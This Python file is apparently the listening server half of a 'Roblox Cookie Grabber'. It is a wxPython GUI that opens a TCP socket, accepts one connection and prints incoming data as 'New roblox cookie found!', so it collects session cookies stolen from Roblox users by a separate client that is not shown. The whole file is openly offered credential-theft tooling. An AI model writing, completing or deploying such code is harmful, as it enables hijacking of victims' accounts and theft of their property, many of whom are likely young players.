import socket
import threading
from colorama import Fore, Style
import wx
import multiprocessing

from modules.template import GUIserver


class Frame(GUIserver):
    def __init__(self, parent, title):
        super(Frame, self).__init__(parent, title=title, size=(800, 800))

        self.btnStart.Bind(wx.EVT_BUTTON, self.onStartServer)
        self.btnStop.Bind(wx.EVT_BUTTON, self.stop)

        self.InitUI()
        self.Show()
        self.Centre()

    def InitUI(self): ...

    def onStartServer(self, event):
        try:
            addr_ip = self.tbIP.GetLineText(0)
            addr_port = self.tbPORT.GetLineText(0)

            self.ADDR = (str(addr_ip), int(addr_port))
        except Exception as e:
            self.print(e)
            return

        ServerStartThread = threading.Thread(
            target=self.run)
        ServerStartThread.start()

    def run(self):
        addr = self.ADDR

        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.s.bind(addr)
        self.s.listen(1)  # 1 connection only

        wx.MessageBox("Server started successfully!")
        self.print(
            f"Server Started! (Server is listening at {addr[0]}:{addr[1]})")

        sock, ad = self.s.accept()

        self.print(
            f"New connection found at {ad}"
        )

        while True:
            try:
                while True:
                    data = sock.recv(1024).decode()
                    if not data:
                        break
                    self.print(f"New roblox cookie found!")
                    self.print(data)
                    break
                break

            except:
                self.print("Error")
                self.s.close()
                wx.MessageBox("pls restart server")
                return

    def stop(self, event):
        self.s.close()
        wx.MessageBox("Server stopped successfully!")
        self.print("Server Closed")

    def print(self, string):
        if self.tbConsole.GetLineText(0):
            self.tbConsole.AppendText("\n")
        self.tbConsole.AppendText(string)


if __name__ == '__main__':
    app = wx.App()
    Frame(None,  'Server (Roblox Cookie Grabber)')
    app.MainLoop()

while True:
    pass
